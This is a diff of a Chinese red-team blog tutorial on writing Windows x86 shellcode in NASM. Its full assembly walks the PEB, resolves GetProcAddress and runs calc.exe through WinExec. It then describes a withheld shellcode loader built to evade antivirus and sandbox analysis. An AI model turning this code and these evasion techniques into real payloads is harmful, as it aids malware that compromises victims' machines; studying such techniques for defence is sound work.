-</span></span><span style="display:flex;"><span>            cmp dword [eax <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x08</span>], <span style="color:#ae81ff">65726464</span>h ; ddre
-</span></span><span style="display:flex;"><span>            jnz Get_Function
-</span></span><span style="display:flex;"><span>    mov esi, [edx <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x24</span>]                ; ESI <span style="color:#f92672">=</span>  ordinals
-</span></span><span style="display:flex;"><span>    add esi, ebx                         ; ESI <span style="color:#f92672">=</span> Ordinals table
-</span></span><span style="display:flex;"><span>    mov cx, [esi <span style="color:#f92672">+</span> ecx <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>]              ; Number of function
-</span></span><span style="display:flex;"><span>    dec ecx
-</span></span><span style="display:flex;"><span>    mov esi, [edx <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1c</span>]                ;  address table
-</span></span><span style="display:flex;"><span>    add esi, ebx                         ; ESI <span style="color:#f92672">=</span> Address table
-</span></span><span style="display:flex;"><span>    mov edx, [esi <span style="color:#f92672">+</span> ecx <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span>]             ; EDX <span style="color:#f92672">=</span> Pointer()
-</span></span><span style="display:flex;"><span>    add edx, ebx                         ; EDX <span style="color:#f92672">=</span> GetProcAddress
-</span></span><span style="display:flex;"><span>    mov eax,edx
-</span></span><span style="display:flex;"><span>    add esp,<span style="color:#ae81ff">0x40</span>
-</span></span><span style="display:flex;"><span>    mov esp,ebp
-</span></span><span style="display:flex;"><span>    pop ebp
-</span></span><span style="display:flex;"><span>    ret
-</span></span></code></pre></div><p>使用NASM汇编器进行汇编：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nasm -f win32 .<span style="color:#ae81ff">\e</span>xec_calc.asm
-</span></span></code></pre></div><p><p class="md__image">
-    
-    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2022-02-16-17-32-05.png" alt=""  />
-  </p></p>
-<p>生成Obj文件后，使用VS Link 链接器进行链接：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>link.exe /OUT:<span style="color:#e6db74">&#34;exec_calc.exe&#34;</span> /MACHINE:X86 /SUBSYSTEM:WINDOWS /NOLOGO /TLBID:1 /ENTRY:Start .<span style="color:#ae81ff">\e</span>xec_calc.obj
-</span></span></code></pre></div><p><p class="md__image">
-    
-    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2022-02-16-17-32-16.png" alt=""  />
-  </p></p>
-<h2 id="0x03-汇编传递字符串的方式">0x03 汇编传递字符串的方式</h2>
-<p>在写Shellcode或者汇编程序的过程中，难免需要将大量的字符串当作参数传递给函数。不能以高级语言的认知去理解汇编语言传递参数，这里涉及到堆栈平衡、字符串在内存中的形态、计算机存储模式（大端、小端）、函数参数入栈方式等，由于本文篇幅与重点有限，不展开讲解了。</p>
-<p>从字符串入栈开始进行调试：</p>
-<p><p class="md__image">
-    
-    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2022-02-16-17-32-34.png" alt=""  />
-  </p></p>
-<p>这一段是调用GetProcAddress这个API，它有两个参数：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>FARPROC <span style="color:#a6e22e">GetProcAddress</span>(
-</span></span><span style="display:flex;"><span>  [in] HMODULE hModule,
-</span></span><span style="display:flex;"><span>  [in] LPCSTR  lpProcName
-</span></span><span style="display:flex;"><span>);
-</span></span></code></pre></div><p>Windows操作系统的API传递参数都是从右向左传递，因此第一个参数就是要获取的函数地址的函数名，这个参数是一个字符串。字符串是一个不固定长度的一段连续的值，所以函数接收的参数类型大部分是一个字符串指针，这个指针指向了字符串的开始位置，函数在读取字符串的适合遇到0x00作为字符串的结尾。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">007</span>D1017     <span style="color:#f92672">|</span> <span style="color:#ae81ff">68</span> <span style="color:#ae81ff">78656300</span>           <span style="color:#f92672">|</span> PUSH <span style="color:#ae81ff">0x636578</span>                                  <span style="color:#f92672">|</span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">007</span>D101C     <span style="color:#f92672">|</span> <span style="color:#ae81ff">68</span> <span style="color:#ae81ff">57696E45</span>           <span style="color:#f92672">|</span> PUSH <span style="color:#ae81ff">0x456E6957</span>                                <span style="color:#f92672">|</span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">007</span>D1021     <span style="color:#f92672">|</span> <span style="color:#ae81ff">54</span>                    <span style="color:#f92672">|</span> PUSH ESP                                       <span style="color:#f92672">|</span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">007</span>D1022     <span style="color:#f92672">|</span> FF75 FC               <span style="color:#f92672">|</span> PUSH DWORD PTR SS:[EBP <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x4</span>]                  <span style="color:#f92672">|</span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">007</span>D1025     <span style="color:#f92672">|</span> FF55 F8               <span style="color:#f92672">|</span> CALL DWORD PTR SS:[EBP <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x8</span>]                  <span style="color:#f92672">|</span>
-</span></span></code></pre></div><p>当栈中压入两个值后，代表了字符串本身已经入栈，再次将指向这个字符串起始位置的内存地址压入栈来完成传入第一个参数的操作，这时刚好ESP栈顶指向的就是字符串的起始位置，所以PUSH ESP就是传递的字符串指针。大部分Shellcode中的字符串传递方式都是如此。</p>
-<p><p class="md__image">
-    
-    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2022-02-16-17-32-51.png" alt=""  />
-  </p></p>
-<h2 id="0x04-shellcode加载器实现">0x04 Shellcode加载器实现</h2>
-<p>思路其实与C语言实现的过程并无任何差异，只不过是用更加灵活的汇编语言完成，汇编语言生成的目标文件经过链接后的体积非常小，使得杀毒软件定位特征变得棘手。</p>
-<p>这个项目的开端是用编写Shellcode的视角去做的，可以生成加载器版本的Shellcode去替换到各类软件中，字节码就是它的灵魂。上一个案例中的程序编译完毕的体积仅仅只有1.5KB，由于对齐的因素实际占用空间4KB。</p>
-<p><p class="md__image">
-    
-    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2022-02-16-17-33-08.png" alt=""  />
-  </p></p>
-<p>思路：寻找PEB →定位Kernel32.DLL的PE基址→定位GetProcAddress API的地址，获取GetFileSize、CreateFileA、ReadFile、CreateFileMappingA、MapViewOfFileA、VirtualAlloc、VirtualProtect这类常用的API地址对Shellcode进行读取，放入可执行的内存，最终call一下执行。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>global StartMain
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>segment .text USE32
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>StartMain:
-</span></span><span style="display:flex;"><span>	; <span style="color:#960050;background-color:#1e0010">这里就不公开了</span>
-</span></span><span style="display:flex;"><span>  ; <span style="color:#960050;background-color:#1e0010">这里就不公开了</span>
-</span></span></code></pre></div><p><p class="md__image">
-    
-    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2022-02-16-17-33-21.png" alt=""  />
-  </p></p>
-<p>生成的样本只有2KB，能够完成Shellcode的执行，我还增加了一系列的反调试功能，预防一些自动分析沙箱，延长样本存活时间。</p>
-
-</div>
-<div class="container">
-    <script src="https://giscus.app/client.js"
-    data-repo="Rvn0xsy/rvn0xsy.github.io"
-    data-repo-id="MDEwOlJlcG9zaXRvcnk0MDEyMzI3MTY="
-    data-category="General"
-    data-category-id="DIC_kwDOF-pTTM4CRDk_"
-    data-mapping="title"
-    data-strict="0"
-    data-reactions-enabled="1"
-    data-emit-metadata="0"
-    data-input-position="bottom"
-    data-theme="dark_tritanopia"
-    data-lang="zh-CN"
-    data-loading="lazy"
-    crossorigin="anonymous"
-    async>
-  </script>
-</div>
-<div class="container">
-    <section class="bio" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-    <div class="bio__blurb">
-        <h2 class="site-h2">网络安全爱好者、安全工具开发者</h2>
-        <p>现阶段在进行红队相关的工作，我的博客会记录一些我的学习过程和部分安全技术研究成果。</p>
-    </div>
-<div class="bio__avatar">
-    <img src="/avatar.jpeg" alt="Duncan McDougall and heir apparent">
-</div></section>
-</div>
-
-        </div>
-<footer class="site-footer">
-    <div class="container">
-        <div class="site-footer__col">
-        <h5>Get in touch</h5>
-        <p>
-            If you like my project or have some questions,feel free
-            to contact me</a>.
-        </p>
-        </div>
-        <div class="site-footer__col site-footer__col--links">
-        <h5>Me Elsewhere</h5>
-        <ul>
-        
-                <li>
-                    <a href="https://twitter.com/Rvn0xsy"><i class="fab fa-twitter"></i> Twitter</a>
-                    
-                </li>
-        
-                <li>
-                    <a href="mailto:rvn0xsy@gmail.com"><i class="fas fa-envelope"></i> E-mail</a>
-                    
-                </li>
-        
-                <li>
-                    <a href="https://github.com/Rvn0xsy"><i class="fab fa-github"></i> Github</a>
-                    
-                </li>
-        
-        </ul>
-        </div>
-        <div class="site-footer__col site-footer__col--links">
-        <h5>Meta Links</h5>
-        <ul>
-            
-                
-                
-                    <li class="">
-                        <a href="/projects/"><i class="fas fa-code"></i> Projects</a>
-                    </li>
-                
-                    <li class="">
-                        <a href="/links/"><i class="fas fa-link"></i> Links</a>
-                    </li>
-                
-                    <li class="">
-                        <a href="/post/"><i class="fa fa-file-alt"></i> Posts</a>
-                    </li>
-                
-                    <li class="">
-                        <a href="/index.xml"><i class="fa fa-rss-square"></i> Rss</a>
-                    </li>
-                
-                    <li class="">
-                        <a href="/tools/"><i class="fas fa-tools"></i> Tools</a>
-                    </li>
-                
-            
-        </ul>
-        </div>
-        <p class="site-footer__copyright">
-        © 倾旋 2021. All rights reserved.
-        </p>
-    </div>
-    </footer>
-
-
-
-<script src="https://cdn.jsdelivr.net/gh/jmnote/plantuml-encoder@1.2.4/dist/plantuml-encoder.min.js" integrity="sha256-Qsk2KRBCN5qVZX7B+8+2IvQl1Aqc723qV1tBCQaVoqo=" crossorigin="anonymous"></script>
-<script>
-(function(){
-  let plantumlPrefix = "language-plantuml";
-  Array.prototype.forEach.call(document.querySelectorAll("[class^=" + plantumlPrefix + "]"), function(code){
-    let image = document.createElement("IMG");
-    image.loading = 'lazy'; 
-    image.src = 'http://www.plantuml.com/plantuml/svg/~1' + plantumlEncoder.encode(code.innerText);
-    code.parentNode.insertBefore(image, code);
-    code.style.display = 'none';
-  });
-})();
-</script>
-
-</body>
-</html>
+</code></pre><p>DLL顺序：0x77ca0000（C:\WINDOWS\SYSTEM32\ntdll.dll）、0x76d20000（C:\WINDOWS\System32\KERNELBASE.dll） 、76b30000（C:\WINDOWS\System32\KERNEL32.DLL）。</p><p>汇编代码解读：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>; Find the address of the Export Table within kernel32.dll
+</span></span><span style=display:flex><span> mov ebx, [eax<span style=color:#f92672>+</span><span style=color:#ae81ff>0x3C</span>]     ; EBX <span style=color:#f92672>=</span> Offset NewEXEHeader  <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xF8</span>
+</span></span><span style=display:flex><span> add ebx, eax            ; EBX <span style=color:#f92672>=</span> <span style=color:#f92672>&amp;</span>NewEXEHeader        <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xF8</span> <span style=color:#f92672>+</span> <span style=color:#f92672>&amp;</span>kernel32.dll
+</span></span><span style=display:flex><span> mov ebx, [ebx<span style=color:#f92672>+</span><span style=color:#ae81ff>0x78</span>]     ; EBX <span style=color:#f92672>=</span> RVA ExportTable      <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x777B0</span> <span style=color:#f92672>=</span> [<span style=color:#f92672>&amp;</span>NewExeHeader <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x78</span>]
+</span></span><span style=display:flex><span> add ebx, eax            ; EBX <span style=color:#f92672>=</span> <span style=color:#f92672>&amp;</span>ExportTable         <span style=color:#f92672>=</span> RVA ExportTable <span style=color:#f92672>+</span> <span style=color:#f92672>&amp;</span>kernel32.dll
+</span></span></code></pre></div><p><code>[eax+0x3C]</code> 此时EAX中保存着DLL的基地址，指向DOS头</p><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2022-02-16-17-29-53.png alt></p></p><p>EAX+0x3C指向DOS头的e_lfanew成员，e_lfanew保存的是从PE文件第一个字节到PE头的文件偏移。mov ebx, [eax+0x3C] 的含义就是将PE头的文件偏移地址保存到ebx。</p><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2022-02-16-17-30-16.png alt></p></p><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2022-02-16-17-31-09.png alt></p></p><p>add ebx, eax 的含义是将PE头的地址保存到ebx中。从PE头向下偏移0x78就是PE文件相对于PE头的导出表偏移地址，后续就是从PE文件寻找导出函数地址了，根据公开的一些Shellcode，可以封装出一些常用的过程，比如从Kernel32.dll中寻找GetProcAddress API的地址，以便后续传入API的名字自动帮助我们去寻找API的地址。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>GetKernel32BaseAddr:
+</span></span><span style=display:flex><span>    push ebp
+</span></span><span style=display:flex><span>    mov ebp,esp
+</span></span><span style=display:flex><span>    sub esp,0x40
+</span></span><span style=display:flex><span>    xor ebx, ebx            ; EBX <span style=color:#f92672>=</span> 0x00000000
+</span></span><span style=display:flex><span>    mov ebx, <span style=color:#f92672>[</span>fs:ebx+0x30<span style=color:#f92672>]</span>  ; EBX <span style=color:#f92672>=</span> Address_of_PEB
+</span></span><span style=display:flex><span>    mov ebx, <span style=color:#f92672>[</span>ebx+0xC<span style=color:#f92672>]</span>      ; EBX <span style=color:#f92672>=</span> Address_of_LDR
+</span></span><span style=display:flex><span>    mov ebx, <span style=color:#f92672>[</span>ebx+0x1C<span style=color:#f92672>]</span>     ; EBX <span style=color:#f92672>=</span> 1st entry in InitOrderModuleList / ntdll.dll
+</span></span><span style=display:flex><span>    mov ebx, <span style=color:#f92672>[</span>ebx<span style=color:#f92672>]</span>          ; EBX <span style=color:#f92672>=</span> 2nd entry in InitOrderModuleList / kernelbase.dll
+</span></span><span style=display:flex><span>    mov ebx, <span style=color:#f92672>[</span>ebx<span style=color:#f92672>]</span>          ; EBX <span style=color:#f92672>=</span> 3rd entry in InitOrderModuleList / kernel32.dll
+</span></span><span style=display:flex><span>    mov eax, <span style=color:#f92672>[</span>ebx+0x8<span style=color:#f92672>]</span>      ; EAX <span style=color:#f92672>=</span> &amp;kernel32.dll / Address of kernel32.dll
+</span></span><span style=display:flex><span>    add esp,0x40
+</span></span><span style=display:flex><span>    mov esp,ebp
+</span></span><span style=display:flex><span>    pop ebp
+</span></span><span style=display:flex><span>    ret
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>GetProcAddrFuncAddr:
+</span></span><span style=display:flex><span>    push ebp
+</span></span><span style=display:flex><span>    mov ebp,esp
+</span></span><span style=display:flex><span>    sub esp,0x40
+</span></span><span style=display:flex><span>    xor ecx, ecx
+</span></span><span style=display:flex><span>    mov ebx, <span style=color:#f92672>[</span>ebp + 8<span style=color:#f92672>]</span> ; EBX <span style=color:#f92672>=</span> Base address
+</span></span><span style=display:flex><span>    mov edx, <span style=color:#f92672>[</span>ebx + 0x3c<span style=color:#f92672>]</span>    ; EDX <span style=color:#f92672>=</span> DOS-&gt;e_lfanew
+</span></span><span style=display:flex><span>    add edx, ebx             ; EDX <span style=color:#f92672>=</span> PE Header
+</span></span><span style=display:flex><span>    mov edx, <span style=color:#f92672>[</span>edx + 0x78<span style=color:#f92672>]</span>    ; EDX <span style=color:#f92672>=</span>  export table
+</span></span><span style=display:flex><span>    add edx, ebx             ; EDX <span style=color:#f92672>=</span> Export table
+</span></span><span style=display:flex><span>    mov esi, <span style=color:#f92672>[</span>edx + 0x20<span style=color:#f92672>]</span>    ; ESI <span style=color:#f92672>=</span>  namestable
+</span></span><span style=display:flex><span>    add esi, ebx             ; ESI <span style=color:#f92672>=</span> Names table
+</span></span><span style=display:flex><span>    xor ecx, ecx             ; EXC <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>    Get_Function:
+</span></span><span style=display:flex><span>            inc ecx                  ; Increment the ordinal
+</span></span><span style=display:flex><span>            lodsd                    ; Get name 
+</span></span><span style=display:flex><span>            add eax, ebx             ; Get <span style=color:#66d9ef>function</span> name
+</span></span><span style=display:flex><span>            cmp dword <span style=color:#f92672>[</span>eax<span style=color:#f92672>]</span>, 50746547h       ; GetP
+</span></span><span style=display:flex><span>            jnz Get_Function
+</span></span><span style=display:flex><span>            cmp dword <span style=color:#f92672>[</span>eax + 0x04<span style=color:#f92672>]</span>, 41636f72h ; rocA
+</span></span><span style=display:flex><span>            jnz Get_Function
+</span></span><span style=display:flex><span>            cmp dword <span style=color:#f92672>[</span>eax + 0x08<span style=color:#f92672>]</span>, 65726464h ; ddre
+</span></span><span style=display:flex><span>            jnz Get_Function
+</span></span><span style=display:flex><span>    mov esi, <span style=color:#f92672>[</span>edx + 0x24<span style=color:#f92672>]</span>                ; ESI <span style=color:#f92672>=</span>  ordinals
+</span></span><span style=display:flex><span>    add esi, ebx                         ; ESI <span style=color:#f92672>=</span> Ordinals table
+</span></span><span style=display:flex><span>    mov cx, <span style=color:#f92672>[</span>esi + ecx * 2<span style=color:#f92672>]</span>              ; Number of <span style=color:#66d9ef>function</span>
+</span></span><span style=display:flex><span>    dec ecx
+</span></span><span style=display:flex><span>    mov esi, <span style=color:#f92672>[</span>edx + 0x1c<span style=color:#f92672>]</span>                ;  address table
+</span></span><span style=display:flex><span>    add esi, ebx                         ; ESI <span style=color:#f92672>=</span> Address table
+</span></span><span style=display:flex><span>    mov edx, <span style=color:#f92672>[</span>esi + ecx * 4<span style=color:#f92672>]</span>             ; EDX <span style=color:#f92672>=</span> Pointer<span style=color:#f92672>()</span>
+</span></span><span style=display:flex><span>    add edx, ebx                         ; EDX <span style=color:#f92672>=</span> GetProcAddress
+</span></span><span style=display:flex><span>    mov eax,edx
+</span></span><span style=display:flex><span>    add esp,0x40
+</span></span><span style=display:flex><span>    mov esp,ebp
+</span></span><span style=display:flex><span>    pop ebp
+</span></span><span style=display:flex><span>    ret
+</span></span></code></pre></div><p>OK，接下来，写一个执行操作系统命令的Shellcode，并使用NASM编译，VS Link进行链接。</p><p>首先，执行操作系统命令的API是<a href=https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winexec>WinExec</a> ：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>
+</span></span><span style=display:flex><span>UINT <span style=color:#a6e22e>WinExec</span>(
+</span></span><span style=display:flex><span>  [in] LPCSTR lpCmdLine,
+</span></span><span style=display:flex><span>  [in] UINT   uCmdShow
+</span></span><span style=display:flex><span>);
+</span></span></code></pre></div><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2022-02-16-17-31-35.png alt></p></p><p>在Kernel32.dll中导出，那这就容易多了。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>; exec_calc.<span style=color:#66d9ef>asm</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>global Start
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>section .data
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>section .text
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Start:
+</span></span><span style=display:flex><span>    push ebp
+</span></span><span style=display:flex><span>    mov ebp, esp
+</span></span><span style=display:flex><span>    sub esp, <span style=color:#ae81ff>0x12</span>
+</span></span><span style=display:flex><span>    call GetKernel32BaseAddr
+</span></span><span style=display:flex><span>    mov dword [ebp<span style=color:#f92672>-</span><span style=color:#ae81ff>4</span>],eax ; Kernel32.dll Base Addr
+</span></span><span style=display:flex><span>    push eax
+</span></span><span style=display:flex><span>    call GetProcAddrFuncAddr
+</span></span><span style=display:flex><span>    mov dword [ebp<span style=color:#f92672>-</span><span style=color:#ae81ff>8</span>],eax ; GetProcAddress
+</span></span><span style=display:flex><span>    push <span style=color:#ae81ff>0x00636578</span> ; xec,<span style=color:#ae81ff>0x00</span>
+</span></span><span style=display:flex><span>    push <span style=color:#ae81ff>0x456e6957</span> ; WinE
+</span></span><span style=display:flex><span>    push esp
+</span></span><span style=display:flex><span>    push dword [ebp<span style=color:#f92672>-</span><span style=color:#ae81ff>4</span>] ; [ebp<span style=color:#f92672>-</span><span style=color:#ae81ff>4</span>] <span style=color:#f92672>-&gt;</span> Kernel32.DLL Base Addr
+</span></span><span style=display:flex><span>    call dword [ebp<span style=color:#f92672>-</span><span style=color:#ae81ff>8</span>] ; [ebp<span style=color:#f92672>-</span><span style=color:#ae81ff>8</span>] <span style=color:#f92672>-&gt;</span> GetProcAddress Addr
+</span></span><span style=display:flex><span>    push <span style=color:#ae81ff>0</span>                ; WinExec uCmdShow
+</span></span><span style=display:flex><span>    push <span style=color:#ae81ff>0x6578652e</span>       ; exe. <span style=color:#f92672>:</span> <span style=color:#ae81ff>6578652</span>e
+</span></span><span style=display:flex><span>    push <span style=color:#ae81ff>0x636c6163</span>       ; clac : <span style=color:#ae81ff>636</span>c6163
+</span></span><span style=display:flex><span>    push esp
+</span></span><span style=display:flex><span>    call eax
+</span></span><span style=display:flex><span>    nop
+</span></span><span style=display:flex><span>    nop
+</span></span><span style=display:flex><span>    add esp,<span style=color:#ae81ff>0x12</span>
+</span></span><span style=display:flex><span>    mov esp,ebp
+</span></span><span style=display:flex><span>    pop ebp
+</span></span><span style=display:flex><span>    ret
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>GetKernel32BaseAddr:
+</span></span><span style=display:flex><span>    push ebp
+</span></span><span style=display:flex><span>    mov ebp,esp
+</span></span><span style=display:flex><span>    sub esp,<span style=color:#ae81ff>0x40</span>
+</span></span><span style=display:flex><span>    xor ebx, ebx            ; EBX <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x00000000</span>
+</span></span><span style=display:flex><span>    mov ebx, [fs:ebx<span style=color:#f92672>+</span><span style=color:#ae81ff>0x30</span>]  ; EBX <span style=color:#f92672>=</span> Address_of_PEB
+</span></span><span style=display:flex><span>    mov ebx, [ebx<span style=color:#f92672>+</span><span style=color:#ae81ff>0xC</span>]      ; EBX <span style=color:#f92672>=</span> Address_of_LDR
+</span></span><span style=display:flex><span>    mov ebx, [ebx<span style=color:#f92672>+</span><span style=color:#ae81ff>0x1C</span>]     ; EBX <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>st entry in InitOrderModuleList <span style=color:#f92672>/</span> ntdll.dll
+</span></span><span style=display:flex><span>    mov ebx, [ebx]          ; EBX <span style=color:#f92672>=</span> <span style=color:#ae81ff>2</span>nd entry in InitOrderModuleList <span style=color:#f92672>/</span> kernelbase.dll
+</span></span><span style=display:flex><span>    mov ebx, [ebx]          ; EBX <span style=color:#f92672>=</span> <span style=color:#ae81ff>3</span>rd entry in InitOrderModuleList <span style=color:#f92672>/</span> kernel32.dll
+</span></span><span style=display:flex><span>    mov eax, [ebx<span style=color:#f92672>+</span><span style=color:#ae81ff>0x8</span>]      ; EAX <span style=color:#f92672>=</span> <span style=color:#f92672>&amp;</span>kernel32.dll <span style=color:#f92672>/</span> Address of kernel32.dll
+</span></span><span style=display:flex><span>    add esp,<span style=color:#ae81ff>0x40</span>
+</span></span><span style=display:flex><span>    mov esp,ebp
+</span></span><span style=display:flex><span>    pop ebp
+</span></span><span style=display:flex><span>    ret
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>GetProcAddrFuncAddr:
+</span></span><span style=display:flex><span>    push ebp
+</span></span><span style=display:flex><span>    mov ebp,esp
+</span></span><span style=display:flex><span>    sub esp,<span style=color:#ae81ff>0x40</span>
+</span></span><span style=display:flex><span>    xor ecx, ecx
+</span></span><span style=display:flex><span>    mov ebx, [ebp <span style=color:#f92672>+</span> <span style=color:#ae81ff>8</span>] ; EBX <span style=color:#f92672>=</span> Base address
+</span></span><span style=display:flex><span>    mov edx, [ebx <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x3c</span>]    ; EDX <span style=color:#f92672>=</span> DOS<span style=color:#f92672>-&gt;</span>e_lfanew
+</span></span><span style=display:flex><span>    add edx, ebx             ; EDX <span style=color:#f92672>=</span> PE Header
+</span></span><span style=display:flex><span>    mov edx, [edx <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x78</span>]    ; EDX <span style=color:#f92672>=</span>  export table
+</span></span><span style=display:flex><span>    add edx, ebx             ; EDX <span style=color:#f92672>=</span> Export table
+</span></span><span style=display:flex><span>    mov esi, [edx <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x20</span>]    ; ESI <span style=color:#f92672>=</span>  namestable
+</span></span><span style=display:flex><span>    add esi, ebx             ; ESI <span style=color:#f92672>=</span> Names table
+</span></span><span style=display:flex><span>    xor ecx, ecx             ; EXC <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>    Get_Function:
+</span></span><span style=display:flex><span>            inc ecx                  ; Increment the ordinal
+</span></span><span style=display:flex><span>            lodsd                    ; Get name 
+</span></span><span style=display:flex><span>            add eax, ebx             ; Get function name
+</span></span><span style=display:flex><span>            cmp dword [eax], <span style=color:#ae81ff>50746547</span>h       ; GetP
+</span></span><span style=display:flex><span>            jnz Get_Function
+</span></span><span style=display:flex><span>            cmp dword [eax <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x04</span>], <span style=color:#ae81ff>41636f</span><span style=color:#ae81ff>72</span>h ; rocA
+</span></span><span style=display:flex><span>            jnz Get_Function
+</span></span><span style=display:flex><span>            cmp dword [eax <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x08</span>], <span style=color:#ae81ff>65726464</span>h ; ddre
+</span></span><span style=display:flex><span>            jnz Get_Function
+</span></span><span style=display:flex><span>    mov esi, [edx <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x24</span>]                ; ESI <span style=color:#f92672>=</span>  ordinals
+</span></span><span style=display:flex><span>    add esi, ebx                         ; ESI <span style=color:#f92672>=</span> Ordinals table
+</span></span><span style=display:flex><span>    mov cx, [esi <span style=color:#f92672>+</span> ecx <span style=color:#f92672>*</span> <span style=color:#ae81ff>2</span>]              ; Number of function
+</span></span><span style=display:flex><span>    dec ecx
+</span></span><span style=display:flex><span>    mov esi, [edx <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x1c</span>]                ;  address table
+</span></span><span style=display:flex><span>    add esi, ebx                         ; ESI <span style=color:#f92672>=</span> Address table
+</span></span><span style=display:flex><span>    mov edx, [esi <span style=color:#f92672>+</span> ecx <span style=color:#f92672>*</span> <span style=color:#ae81ff>4</span>]             ; EDX <span style=color:#f92672>=</span> Pointer()
+</span></span><span style=display:flex><span>    add edx, ebx                         ; EDX <span style=color:#f92672>=</span> GetProcAddress
+</span></span><span style=display:flex><span>    mov eax,edx
+</span></span><span style=display:flex><span>    add esp,<span style=color:#ae81ff>0x40</span>
+</span></span><span style=display:flex><span>    mov esp,ebp
+</span></span><span style=display:flex><span>    pop ebp
+</span></span><span style=display:flex><span>    ret
+</span></span></code></pre></div><p>使用NASM汇编器进行汇编：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>nasm -f win32 .<span style=color:#ae81ff>\e</span>xec_calc.asm
+</span></span></code></pre></div><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2022-02-16-17-32-05.png alt></p></p><p>生成Obj文件后，使用VS Link 链接器进行链接：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>link.exe /OUT:<span style=color:#e6db74>&#34;exec_calc.exe&#34;</span> /MACHINE:X86 /SUBSYSTEM:WINDOWS /NOLOGO /TLBID:1 /ENTRY:Start .<span style=color:#ae81ff>\e</span>xec_calc.obj
